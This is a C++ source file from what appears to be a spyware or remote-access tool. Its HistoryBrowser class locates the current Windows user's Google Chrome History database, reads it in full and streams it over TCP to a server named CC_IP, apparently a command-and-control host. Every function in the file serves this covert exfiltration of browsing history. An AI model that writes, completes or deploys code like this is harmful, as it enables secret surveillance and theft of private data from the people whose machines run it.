#include "HistoryBrowser.h"

HistoryBrowser::HistoryBrowser()
{
}

HistoryBrowser::~HistoryBrowser()
{
}

void HistoryBrowser::sendHistory()
{
	vector<unsigned char> data = this->getHistoryFile();

	SOCKET soc = Communicator::TCP::createSocket();
	SOCKET client_soc = Communicator::TCP::connect(soc, CC_IP, HISTORY_TRANSFER_PORT);
	//Communicator::TCP::Send(soc, "5\nHello", 7);
	
	int size = data.size() * sizeof(unsigned char);//file size
	int count = 0;
	string str_size = to_string(size) + COMMANDS_SEPERATOR;
	Communicator::TCP::Send(soc, str_size.c_str(), str_size.length());
	while (count + TCP_PACKET_BUFFER_SIZE  < size)
	{
		Communicator::TCP::Send(soc, (const char*)&data[count], TCP_PACKET_BUFFER_SIZE);
		count += TCP_PACKET_BUFFER_SIZE;
	}
	Communicator::TCP::Send(soc, (const char*)&data[count], size - count);
	
	soc = Communicator::TCP::destroySocket(soc);
	//client_soc = Communicator::TCP::destroySocket(client_soc);
	return;
}

/* Copies Chrome's History file on windows 10 and returns it
Input: None
Output: vector<unsigned char> - History.db file
*/
vector<unsigned char> HistoryBrowser::getHistoryFile()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	string historyLoc = "C:\\Users\\" + string(username) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";

	ifstream input(historyLoc, ios::binary);

	// copies all data into buffer
	vector<unsigned char> buffer(istreambuf_iterator<char>(input), {});

	return buffer;
}
